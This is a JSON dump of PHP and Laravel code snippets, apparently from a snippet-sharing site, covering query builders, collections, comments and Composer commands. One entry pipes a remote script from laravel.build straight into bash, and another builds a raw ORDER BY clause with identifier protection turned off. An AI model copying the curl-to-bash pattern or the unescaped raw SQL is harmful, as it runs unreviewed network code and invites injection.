[\"status\"=>\"working\"]; //Edit just above /\\ if you don't need extra \"where\" clause $query = $this->db->select()             ->from($table)             ->where('id', $id)             ->get_compiled_select(); $data = $this->db->query(\"$query FOR UPDATE\")->row_array(); $this->db->where('id', $data['id'])->update($table,$update);\n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 710,
    "keyword": null,
    "link": null,
    "title": " codeigniter where order by",
    "description": "$this->db->from($this->table_name); $this->db->order_by(\"name\", \"asc\"); $query = $this->db->get();  return $query->result();\n$this->db->select('ae_users.employee_id, ae_users.emp_name, ae_users.emp_name2, ae_users.emp_name3'); \t\t$this->db->from('ae_users');                 \t\t$this->db->where_in('ae_users.employee_id',$employee_ids);       \t\t$query =$this->db->get();               \t\tif ($query->num_rows()) { \t\t\treturn $query->result_array(); \t\t} else { \t\t\treturn 0; \t\t}\n$this->db->select('ae_users.employee_id, ae_users.emp_name, ae_users.emp_name2, ae_users.emp_name3'); \t\t$this->db->from('ae_users');                 \t\t$this->db->where_in('ae_users.employee_id',$employee_ids);                 $this->db->_protect_identifiers = FALSE; // stop CI adding backticks                 $order = sprintf('FIELD(ae_users.employee_id, %s)', implode(', ', $employee_ids));                 $this->db->order_by($order);                 $this->db->_protect_identifiers = TRUE;  \t\t$query =$this->db->get();                // echo '<pre>'; print_r($this->db->last_query());exit; \t\tif ($query->num_rows()) { \t\t\treturn $query->result_array(); \t\t} else { \t\t\treturn 0; \t\t}\n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 711,
    "keyword": null,
    "link": null,
    "title": " collapse and expand phpstorm",
    "description": "ctrl + -numpad  = collapse  ctrl + +numpad  = expand \n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 712,
    "keyword": null,
    "link": null,
    "title": " collapse open by default",
    "description": "<div id=\"accordion\">   <div class=\"card\">     <div class=\"card-header\" id=\"headingOne\">       <h5 class=\"mb-0\">         <button class=\"btn btn-link\" data-toggle=\"collapse\" data-target=\"#collapseOne\" aria-expanded=\"true\" aria-controls=\"collapseOne\">           Collapsible Group Item #1         </button>       </h5>     </div>      <div id=\"collapseOne\" class=\"collapse show\" aria-labelledby=\"headingOne\" data-parent=\"#accordion\">       <div class=\"card-body\">         Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod. Brunch 3 wolf moon tempor, sunt aliqua put a bird on it squid single-origin coffee nulla assumenda shoreditch et. Nihil anim keffiyeh helvetica, craft beer labore wes anderson cred nesciunt sapiente ea proident. Ad vegan excepteur butcher vice lomo. Leggings occaecat craft beer farm-to-table, raw denim aesthetic synth nesciunt you probably haven't heard of them accusamus labore sustainable VHS.       </div>     </div>   </div>   <div class=\"card\">     <div class=\"card-header\" id=\"headingTwo\">       <h5 class=\"mb-0\">         <button class=\"btn btn-link collapsed\" data-toggle=\"collapse\" data-target=\"#collapseTwo\" aria-expanded=\"false\" aria-controls=\"collapseTwo\">           Collapsible Group Item #2         </button>       </h5>     </div>     <div id=\"collapseTwo\" class=\"collapse\" aria-labelledby=\"headingTwo\" data-parent=\"#accordion\">       <div class=\"card-body\">         Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod. Brunch 3 wolf moon tempor, sunt aliqua put a bird on it squid single-origin coffee nulla assumenda shoreditch et. Nihil anim keffiyeh helvetica, craft beer labore wes anderson cred nesciunt sapiente ea proident. Ad vegan excepteur butcher vice lomo. Leggings occaecat craft beer farm-to-table, raw denim aesthetic synth nesciunt you probably haven't heard of them accusamus labore sustainable VHS.       </div>     </div>   </div>   <div class=\"card\">     <div class=\"card-header\" id=\"headingThree\">       <h5 class=\"mb-0\">         <button class=\"btn btn-link collapsed\" data-toggle=\"collapse\" data-target=\"#collapseThree\" aria-expanded=\"false\" aria-controls=\"collapseThree\">           Collapsible Group Item #3         </button>       </h5>     </div>     <div id=\"collapseThree\" class=\"collapse\" aria-labelledby=\"headingThree\" data-parent=\"#accordion\">       <div class=\"card-body\">         Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod. Brunch 3 wolf moon tempor, sunt aliqua put a bird on it squid single-origin coffee nulla assumenda shoreditch et. Nihil anim keffiyeh helvetica, craft beer labore wes anderson cred nesciunt sapiente ea proident. Ad vegan excepteur butcher vice lomo. Leggings occaecat craft beer farm-to-table, raw denim aesthetic synth nesciunt you probably haven't heard of them accusamus labore sustainable VHS.       </div>     </div>   </div> </div>\nclass=\"collapse show\"\n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 713,
    "keyword": null,
    "link": null,
    "title": " collect file name with owner name in array",
    "description": "<?php function groupByOwners(array $files) : array { \t$newArray = array();     foreach($files as $key=>$f){     \t//print \" $key => $f <br/>\";         //$newArray[$f] = array_keys($files, $f);         $newArray[$f][] = $key; #stackOverflow Answer     }     return $newArray; }  $files = array (     \"Input.txt\" => \"Randy\",     \"Code.py\" => \"Stan\",     \"Output.txt\" => \"Randy\" ); //var_dump(groupByOwners($files)); print_r(groupByOwners($files)); ?> Given the Array: [\"Input.txt\" => \"Randy\", \"Code.py\" => \"Stan\", \"Output.txt\" => \"Randy\"] Expected Returns: [\"Randy\" => [\"Input.txt\", \"Output.txt\"], \"Stan\" => [\"Code.py\"]] \n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 714,
    "keyword": null,
    "link": null,
    "title": " collection empty laravel",
    "description": "$isempty = $collection->isEmpty();\n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 715,
    "keyword": null,
    "link": null,
    "title": " collection laravel filter",
    "description": "$collection = collect([1, 2, 3, 4]);  $filtered = $collection->filter(function ($value, $key) {     return $value > 2; });  $filtered->all();  // [3, 4]\n$itemCollection = collect($contacts); $filtered = $itemCollection->filter(function($item) use ($search) {     return stripos($item['username'],$search) !== false; }); \n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 716,
    "keyword": null,
    "link": null,
    "title": " collection map laravel",
    "description": "// The array we're going to return     $data = [];     // Query the users table $query = users::where('id', 1)->get();  // Let's Map the results from [$query] $map = $query->map(     function($items){           $data['user_firstName'] = $items->firstName;           $data['user_lastName'] = $items->lastName;           return $data;         }     );  return $map;\n$collection = collect([     [         'name' => 'John',         'department' => 'Sales',         'email' => 'john@example.com'     ],     [         'name' => 'Jane',         'department' => 'Marketing',         'email' => 'jane@example.com'     ] ]);  $keyed = $collection->mapWithKeys(function ($item) {     return [$item['email'] => $item['name']]; });  $keyed->all();  /*     [         'john@example.com' => 'John',         'jane@example.com' => 'Jane',     ] */\n$collection = collect([1, 2, 3, 4, 5]);  $multiplied = $collection->map(function ($item, $key) {     return $item * 2; });  $multiplied->all();  // [2, 4, 6, 8, 10]\n$collection->each(function ($item, $key) {     hj });\n// The array we're going to return$data = [];// Query the users table$query = users::where('id', 1)->get();// Let's Map the results from [$query]$map = $query->map(function($items){   $data['user_firstName'] = $items->firstName;   $data['user_lastName] = $items->lastName;   return $data;});return $map;\n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 717,
    "keyword": null,
    "link": null,
    "title": " collection pluck remove duplicates",
    "description": "  $userIds = collect($participants['items'])->pluck('user_id')->unique()->toArray();   //$unique = $collection->unique();   \n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 718,
    "keyword": null,
    "link": null,
    "title": " column of csv to array php",
    "description": "$csv = array_map(\"str_getcsv\", file(\"data.csv\", \"r\"));  $header = array_shift($csv);  // Seperate the header from data  $col = array_search(\"Value\", $header);   foreach ($csv as $row) {        $array[] = $row[$col];  } \n$csv = array_map('str_getcsv', file('data.csv'));\n",
    "reg_date": "2021-10-12T10:13:12.000Z"
  },
  {
    "id": 719,
    "keyword": null,
    "link": null,
    "title": " combine 2 columns search query laravel",
    "description": "public function index() {     $users = User::select(\"*\", DB::raw(\"CONCAT(users.first_name,' ',users.last_name) as full_name\"))         ->get();        return view('home', compact('users')); }\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 720,
    "keyword": null,
    "link": null,
    "title": " combine two query value in laravel 8",
    "description": " // get all film projects $filmProjects= FilmProject::all();   // get all new media projects $newMediaProjects=  NewMediaProject::all();   // merge projects, foreach($filmProjects as $filmProject) {     $newMediaProjects->add($filmProject); }   // or we can also do this $newMediaProjects->toBase()->merge($filmProjects);   dd($newMediaProjects->toArray());\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 721,
    "keyword": null,
    "link": null,
    "title": " command laravel for php artisan make :auth",
    "description": "composer require laravel/ui php artisan ui vue --auth\nLaravel's laravel/ui package provides a quick way to scaffold all of the routes and views you need for authentication using a few simple commands:  composer require laravel/ui  php artisan ui vue --auth\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 722,
    "keyword": null,
    "link": null,
    "title": " command not found: laravel",
    "description": "export PATH=\"$PATH:$HOME/.composer/vendor/bin\" \nexport PATH=~/.config/composer/vendor/bin:$PATH  source ~/.bashrc\necho 'export PATH=\"~/.config/composer/vendor/bin\"' >> ~/.bashrc # or echo 'export PATH=\"~/.config/composer/vendor/bin\"' >> ~/.zshrc\n#these commands executed on Ubunyu 20.04 export PATH=~/.config/composer/vendor/bin:$PATH source ~/.bashrc\nsource ~/.bashrc \n# For mac just run these 2 commands echo 'export PATH=\"$HOME/.composer/vendor/bin:$PATH\"' >>  ~/.zshrc source ~/.zshrc\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 723,
    "keyword": null,
    "link": null,
    "title": " command to run php file on chrome",
    "description": "php -S locahost:8000   \n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 724,
    "keyword": null,
    "link": null,
    "title": " comment in php",
    "description": " <?php  /*     echo 'This is a test'; /* This comment will cause a problem */  */ ?>  \n<?php // Author : https://www.codedweb.org/ // This is a single-line comment # This is also a single-line comment in unix and linux    /* This is a Multi-lines comment block by this way you can add muliple lines on it.  lines */    // You can also use comments to leave out parts of a code line $var = 2 /* + 12 */ + 2; echo $var; ?>\n A nice way to toggle the commenting of blocks of code can be done by mixing the two comment styles: <?php //* if ($foo) {   echo $bar; } // */ sort($morecode); ?>  Now by taking out one / on the first line..  <?php /* if ($foo) {   echo $bar; } // */ sort($morecode); ?> ..the block is suddenly commented out. This works because a /* .. */ overrides //. You can even \"flip\" two blocks, like this: <?php //* if ($foo) {   echo $bar; } /*/ if ($bar) {   echo $foo; } // */ ?> vs <?php /* if ($foo) {   echo $bar; } /*/ if ($bar) {   echo $foo; } // */ ?>  \n <?php     echo 'This is a test'; // This is a one-line c++ style comment     /* This is a multi line comment        yet another line of comment */     echo 'This is yet another test';     echo 'One Final Test'; # This is a one-line shell-style comment ?>  \n It is worth mentioning that, HTML comments have no meaning in PHP parser. So,  <!-- comment <?php echo some_function(); ?> -->  WILL execute some_function() and echo result inside HTML comment. \n Comments in PHP can be used for several purposes, a very interesting one being that you can generate API documentation directly from them by using PHPDocumentor (http://www.phpdoc.org/).  Therefor one has to use a JavaDoc-like comment syntax (conforms to the DocBook DTD), example: <?php /** * The second * here opens the DocBook commentblock, which could later on<br> * in your development cycle save you a lot of time by preventing you having to rewrite<br> * major documentation parts to generate some usable form of documentation. */ ?> Some basic html-like formatting is supported with this (ie <br> tags) to create something of a layout. \n Notes can come in all sorts of shapes and sizes. They vary, and their uses are completely up to the person writing the code. However, I try to keep things consistent in my code that way it's easy for the next person to read. So something like this might help...  <?php  //====================================================================== // CATEGORY LARGE FONT //======================================================================  //----------------------------------------------------- // Sub-Category Smaller Font //-----------------------------------------------------  /* Title Here Notice the First Letters are Capitalized */  # Option 1 # Option 2 # Option 3  /*  * This is a detailed explanation  * of something that should require  * several paragraphs of information.  */   // This is a single line quote. ?>  \n it's perhaps not obvious to some, but the following code will cause a parse error! the ?> in //?> is not treated as commented text, this is a result of having to handle code on one line such as <?php echo 'something'; //comment ?>  <?php if(1==1) {     //?> } ?>  i discovered this \"anomally\" when i commented out a line of code containing a regex which itself contained ?>, with the // style comment. e.g. //preg_match('/^(?>c|b)at$/', 'cat', $matches); will cause an error while commented! using /**/ style comments provides a solution. i don't know about # style comments, i don't ever personally use them. \n <h1>This is an <?php # echo 'simple';?> example</h1> <p>The header above will say 'This is an  example'.</p> \n MSpreij (8-May-2005) says  /* .. */ overrides //   Anonymous (26-Jan-2006) says // overrides /* .. */  Actually, both are correct. Once a comment is opened, *everything* is ignored until the end of the comment (or the end of the php block) is reached.  Thus, if a comment is opened with:     //  then /* and */ are \"overridden\" until after end-of-line     /*  then // is \"overridden\" until after */ \n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 725,
    "keyword": null,
    "link": null,
    "title": " comment php",
    "description": "// This is a single-line comment  # This is also a single-line comment  /* This is a multiple-lines comment block that spans over multiple lines */\n <?php  /*     echo 'This is a test'; /* This comment will cause a problem */  */ ?>  \n<?php // Author : https://www.codedweb.org/ // This is a single-line comment # This is also a single-line comment in unix and linux    /* This is a Multi-lines comment block by this way you can add muliple lines on it.  lines */    // You can also use comments to leave out parts of a code line $var = 2 /* + 12 */ + 2; echo $var; ?>\n<?php // This is a single-line comment  # This is also a single-line comment    /* This is a multiple-lines comment block that spans over multiple lines */    // You can also use comments to leave out parts of a code line $x = 5 /* + 15 */ + 5; echo $x; ?>\n/**  * This function compiles a message that tells you how great coffee is  *  * @param string  $compliment A nice word to describe coffee   * @param integer $score      A score out of 10  */\n// This is a single-line comment # This is also a single-line comment /* This is a multiple-lines comment block that spans over multiple lines */\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 726,
    "keyword": null,
    "link": null,
    "title": " comments.php template",
    "description": "  wp_list_comments( array(       'style'       => 'ol',       'short_ping'  => true,       'avatar_size' => 20,   ) );\n Answer: Use the Syntax \"// text\" (single line) and \"/* text */\" (multi-line)\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 727,
    "keyword": null,
    "link": null,
    "title": " comments in php",
    "description": "// This is a single-line comment  # This is also a single-line comment  /* This is a multiple-lines comment block that spans over multiple lines */\n<?php // Author : https://www.codedweb.org/ // This is a single-line comment # This is also a single-line comment in unix and linux    /* This is a Multi-lines comment block by this way you can add muliple lines on it.  lines */    // You can also use comments to leave out parts of a code line $var = 2 /* + 12 */ + 2; echo $var; ?>\n<?php // This is a single-line comment  # This is also a single-line comment    /* This is a multiple-lines comment block that spans over multiple lines */    // You can also use comments to leave out parts of a code line $x = 5 /* + 15 */ + 5; echo $x; ?>\n/**  * This function compiles a message that tells you how great coffee is  *  * @param string  $compliment A nice word to describe coffee   * @param integer $score      A score out of 10  */\n//For a single line comment use //: //this is a comment too //for multi-line comments use /* and */: /* <--start of multi-line comment this is a comment  this is a comment too (end of multi-line comment)-->*/\n// /* */\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 728,
    "keyword": null,
    "link": null,
    "title": " common array methods php",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\nsizeof($arr) //returns the size of elements in the array is_array($arr) // returns true if $arr is an array and false otherwise in_array($var, $arr) // check if $var is in the array $arr print_r($arr) // prints the complete representation of the array array_merge($arr1, $arr2) //combines $arr1 and $arr2 into a single array array_values($arr) //store all the values into a new array without the keys but only the values array_keys($arr) // returns only the keys inside an array array_pop($arr) // removes the last element of  the array array_push($arr, $val) // pushes $val to the end of array array_shift($arr) // removes the first element in the array $arr sort($arr) // sorts an array in an ascending order  /*Other sorting methods are: -asort() -arsort() -ksort() -krsort() -rsort() */  array_map('function_name', $arr) // passes each value in the array inside the fuction and do the operation on the array data array_flip($arr) //This function interchange the keys and the values of a PHP associative array. array_reverse($arr) //This function is used to reverse the order of elements array_rand($arr) //randomly pick an element from the array array_slice($arr, $offset, $length)//This function is used to create a subset of any array      \nif (count($arr) > 1) {      .... }\n$key_of_max_value = array_search(max($arrCompare),$arrCompare);\nprint_r(deep_delete_keys($arr,'country'));  function deep_delete_keys($arr, $keys) {     if (!is_array($keys)) $keys = array($keys);     $filteredArr = array_diff_key( $arr, array_flip( $keys ) );     foreach ($filteredArr as &$val) {         if (is_array($val)) {             $val = deep_delete_keys($val, $keys);         }     }     return $filteredArr; }\n const triplets = (arr1,arr2) => {   let score1 = 0;   let score2 = 0;   let resultArr = [0,0]   for (let i = 0; i < arr1.length; i++){     if(arr1[i] === arr2[i]) {       resultArr[0] = score1       resultArr[1] = score2     } else if (arr1[i] > arr2[i]) {       score1++       resultArr[0] = score1     } else if (arr1[i] < arr2[i]) {       score2++       resultArr[1] = score2     }   }   return resultArr }\n <?php $array = array(     \"foo\" => \"bar\",     42    => 24,     \"multi\" => array(          \"dimensional\" => array(              \"array\" => \"foo\"          )     ) );  var_dump($array[\"foo\"]); var_dump($array[42]); var_dump($array[\"multi\"][\"dimensional\"][\"array\"]); ?>  \n <?php $array = array(\"foo\", \"bar\", \"hello\", \"world\"); var_dump($array); ?>  \n$arrRoom[] = array(\"RoomCode\" => \"Deluxe\",                     \"Rates\" => array ( array(                         \"BoardCode\" => \"RO\",                         \"Price\" => 100)                     )); $arrRoom[] = array(\"RoomCode\" => \"Standard\",                     \"Rates\" => array ( array(                         \"BoardCode\" => \"RO\",                         \"Price\" => 100)                                             ));                     $arrRoom[] = array(\"RoomCode\" => \"Deluxe\",                     \"Rates\" => array (array(                         \"BoardCode\" => \"RO\",                         \"Price\" => 200)                     ));  foreach($arrRoom as $room) {         foreach($room['Rates'] as $rates)     {                 $nRooms[$room['RoomCode']][$rates['BoardCode']][] = array(\"RoomCode\" => $room['RoomCode'],                                                             \"MealCode\" => $rates['BoardCode'],                                                             \"Price\" => $rates['Price']);     } } echo \"\\n ==== Output in Json Format ==== \\n\"; {     \"Deluxe\": {         \"RO\": [             {                 \"RoomCode\": \"Deluxe\",                 \"MealCode\": \"RO\",                 \"Price\": 100             },             {                 \"RoomCode\": \"Deluxe\",                 \"MealCode\": \"RO\",                 \"Price\": 200             }         ]     },     \"Standard\": {         \"RO\": [             {                 \"RoomCode\": \"Standard\",                 \"MealCode\": \"RO\",                 \"Price\": 100             }         ]     } }\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 729,
    "keyword": null,
    "link": null,
    "title": " compare dates datetime php",
    "description": "$today = date(\"Y-m-d\"); $expire = $row->expireDate; //from database  $today_time = strtotime($today); $expire_time = strtotime($expire);  if ($expire_time < $today_time) { /* do Something */ }\n<?php  $datetime1 = new DateTime('2009-10-11 12:12:00'); $datetime2 = new DateTime('2009-10-13 10:12:00');  if ($datetime1 > $datetime2) {     echo 'datetime1 greater than datetime2'; }  if ($datetime1 < $datetime2) {     echo 'datetime1 lesser than datetime2'; }  if ($datetime1 == $datetime2) {     echo 'datetime2 is equal than datetime1'; }\n$date1 = new DateTime(\"now\"); $date2 = new DateTime(\"tomorrow\");  var_dump($date1 == $date2); // false var_dump($date1 < $date2); // true var_dump($date1 > $date2); // false \n$date_now = date(\"Y-m-d h:i:s\"); $variable = new DateTime($date_now); $to_compare = \"2018-06-01 12:48:09\"; $variable1 = new DateTime($to_compare); $difference = date_diff($variable, $variable1)->format(\"Difference => %Y years, %m months, %d days, %h hours, and %i minutes\"); echo $difference;\n$date1 = \"2021-01-15\"; $date2 = \"2021-01-18\";  if ($date1 < $date2) {  \techo \"$date1 is earlier than $date2\"; } else { \techo \"$date1 is later than $date2\"; }\n",
    "reg_date": "2021-10-12T10:13:13.000Z"
  },
  {
    "id": 730,
    "keyword": null,
    "link": null,
    "title": " compare hash with plain text php",
    "description": "// To compare hash with plain text, use password_verify(\"MySuperSafePassword!\", $hashed_password)    // Please note, that works only with the password_hash() function.\n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 731,
    "keyword": null,
    "link": null,
    "title": " compare two arrays and return the difference php",
    "description": " <?php $array1 = array(\"a\" => \"green\", \"red\", \"blue\", \"red\"); $array2 = array(\"b\" => \"green\", \"yellow\", \"red\"); $result = array_diff($array1, $array2);  print_r($result); ?>  Array (     [1] => blue )\narray_merge(array_diff($array1,$array2),array_diff($array2,$array1)) \n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 732,
    "keyword": null,
    "link": null,
    "title": " complete url php",
    "description": "//Get complete URL with http/https and GET parameters $complete_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\";\n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 733,
    "keyword": null,
    "link": null,
    "title": " composer",
    "description": "composer create-project --prefer-dist laravel/laravel test \"8.*\"\n--ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 734,
    "keyword": null,
    "link": null,
    "title": " composer allowed memory size",
    "description": "COMPOSER_MEMORY_LIMIT=-1 composer require owen-it/laravel-auditing\nphp -d memory_limit=512M /usr/local/bin/composer update\nexport COMPOSER_MEMORY_LIMIT=-1\n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 735,
    "keyword": null,
    "link": null,
    "title": " composer autoload",
    "description": "composer dumpautoload -o\nrequire __DIR__ . '/vendor/autoload.php';  $log = new Monolog\\Logger('name'); $log->pushHandler(new Monolog\\Handler\\StreamHandler('app.log', Monolog\\Logger::WARNING)); $log->addWarning('Foo');\ncomposer require name-of-package\n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 736,
    "keyword": null,
    "link": null,
    "title": " composer cache clean",
    "description": "$ composer clearcache \n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 737,
    "keyword": null,
    "link": null,
    "title": " composer clear cache",
    "description": "composer clearcache //Then autoload composer composer dump-autoload\ncomposer clearcache  #You can also use   composer clear-cache  #which is an alias for clearcache.  \n$ composer clearcache \nRoute::get('/clear-cache', function() {     $exitCode = Artisan::call('cache:clear');     // return what you want });\n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 738,
    "keyword": null,
    "link": null,
    "title": " composer create-project --prefer-dist laravel/laravel blog",
    "description": "composer create-project laravel/laravel myproject --prefer-dist v8.15.0 \n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 739,
    "keyword": null,
    "link": null,
    "title": " composer create project laravel 7",
    "description": "composer create-project --prefer-dist laravel/laravel:^7.0 blog \ncomposer create-project --prefer-dist laravel/laravel ProjectName dev-develop\ncomposer create-project laravel/laravel=4.1.27 your-project-name --prefer-dist\ncurl -s https://laravel.build/app-name | bash <!-- OR --> composer create-project --prefer-dist laravel/laravel app-name \"8.*\"\n",
    "reg_date": "2021-10-12T10:13:14.000Z"
  },
  {
    "id": 740,
    "keyword": null,
    "link": null,
    "title": " composer detected issues in your platform: your composer dependencies require the following php extensions to be installed: xml",
    "description": "sudo yum search php-THE_EXTENSION  sudo yum install THE_EXTENSION_FROM_LIST\n//make a config file /*Follow this trick  add this line in config object of composer.json file  \"platform-check\": false  run php artisan config:cache  then run composer dump-autoload in terminal*/  {  \"config\": {      \"platform-check\": false }  } \n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 741,
    "keyword": null,
    "link": null,
    "title": " composer don't load class",
    "description": "composer dumpautoload -o\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 742,
    "keyword": null,
    "link": null,
    "title": " composer ignore platform reqs",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 743,
    "keyword": null,
    "link": null,
    "title": " composer install ignore platform reqs",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 744,
    "keyword": null,
    "link": null,
    "title": " composer install ignore platform requirements",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 745,
    "keyword": null,
    "link": null,
    "title": " composer install without dependencies",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 746,
    "keyword": null,
    "link": null,
    "title": " composer laravel ui",
    "description": "composer require laravel/ui    // Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\n// Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\ncomposer require laravel/ui:^2.4\ncomposer require laravel/ui=\"1.*\" --dev\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 747,
    "keyword": null,
    "link": null,
    "title": " composer memory limit",
    "description": "COMPOSER_MEMORY_LIMIT=-1 composer require owen-it/laravel-auditing\nCOMPOSER_MEMORY_LIMIT=-1 composer update \nphp -d memory_limit=512M /usr/local/bin/composer update\nphp -d memory_limit=-1 path_to_composer.phar_that_threw_the_error update\nCOMPOSER_MEMORY_LIMIT=-1 composer update\nsudo /bin/dd if=/dev/zero of=/var/swap.1 bs=1M count=1024 sudo /sbin/mkswap /var/swap.1 sudo /sbin/swapon /var/swap.1 \n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 748,
    "keyword": null,
    "link": null,
    "title": " composer require guzzlehttp/guzzle",
    "description": "To install guzzlehttp composer require guzzlehttp/guzzle  Ref : https://packagist.org/packages/guzzlehttp/guzzle\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 749,
    "keyword": null,
    "link": null,
    "title": " composer require laravel/ui for laravel 6",
    "description": "composer require laravel/ui    // Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\n// Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\ncomposer require laravel/ui:^2.4\ncomposer require laravel/ui=\"1.*\" --dev\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 750,
    "keyword": null,
    "link": null,
    "title": " composer require laravel/ui laravel 7",
    "description": "composer require laravel/ui    // Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\n// Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\ncomposer require laravel/ui:^2.4\ncomposer require laravel/ui=\"1.*\" --dev\n",
    "reg_date": "2021-10-12T10:13:15.000Z"
  },
  {
    "id": 751,
    "keyword": null,
    "link": null,
    "title": " composer require laravel/ui not working laravel 7",
    "description": "composer require laravel/ui:^2.4 \ncomposer require laravel/ui:^2.4\n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 752,
    "keyword": null,
    "link": null,
    "title": " composer takes older version of php",
    "description": "composer install --ignore-platform-reqs\n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 753,
    "keyword": null,
    "link": null,
    "title": " composer update",
    "description": "composer self-update\n$ composer clearcache \nphp composer.phar update\n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 754,
    "keyword": null,
    "link": null,
    "title": " composer update php mbstring.so missing",
    "description": "sudo apt-get install php7.1-mbstring \n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 755,
    "keyword": null,
    "link": null,
    "title": " composite unique between two columns laravel migration",
    "description": "$table->unique(['mytext', 'user_id']);\n    public function up()     {         Schema::table('user_projects', function (Blueprint $table) {             $table->unique([\"user_id\", \"project_id\"], 'user_project_unique');         });     }      public function down()     {         Schema::table('user_projects', function (Blueprint $table) {           $table->dropUnique('user_project_unique');         });     } \n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 756,
    "keyword": null,
    "link": null,
    "title": " compser udate wiith --ignore-platform-req",
    "description": "composer install --ignore-platform-reqs \n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 757,
    "keyword": null,
    "link": null,
    "title": " concat in where clause laravel query builder",
    "description": "$query = DB::table('mbo_party')->where(DB::raw(\"CONCAT(first,' ',last)\"), 'LIKE', '%' . $party_name . '%')->first(); \n$query->orWhere(DB::raw(\"CONCAT(`nvp`, ' ', `vpv`)\"), 'LIKE', \"%\".$this->searchNeedle.\"%\"); \n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 758,
    "keyword": null,
    "link": null,
    "title": " config clear laravel",
    "description": "php artisan config:clear \n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 759,
    "keyword": null,
    "link": null,
    "title": " confirm before submit form php",
